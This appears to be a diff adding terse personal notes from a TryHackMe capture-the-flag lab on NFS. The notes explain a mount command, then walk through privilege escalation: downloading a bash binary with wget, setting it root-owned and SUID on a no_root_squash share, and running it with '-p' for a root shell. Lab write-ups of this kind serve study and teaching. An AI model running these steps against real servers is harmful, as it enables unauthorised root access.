@@ -1,0 +1,25 @@
+sudo mount -t nfs IP:share /tmp/mount/ -nolock
+
+  Tag 			                  Function
+ sudo		     Run as root
+ mount		     Execute the mount command
+ -t nfs		     Type of device to mount, then specifying that it's NFS
+ IP:share	     The IP Address of the NFS server, and the name of the share we wish to mount
+-nolock		     Specifies not to use NLM locking
+
+mkdir /tmp/mount
+sudo mount -t nfs 10.10.10.122:home /tmp/mount/ -nolock
+
+directory after ls in /tmp/mount : `cappucino`
+
+wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash ( if it need)
+
+
+chown root bash
+chmod +x bash
+chmod +s bash
+
+cp /home/kali/Downloads/tryhackme/Network_Services_2/bash . ( move to . in mount)
+mv bash /tmp/mount/cappucino
+
+./bash -p : 
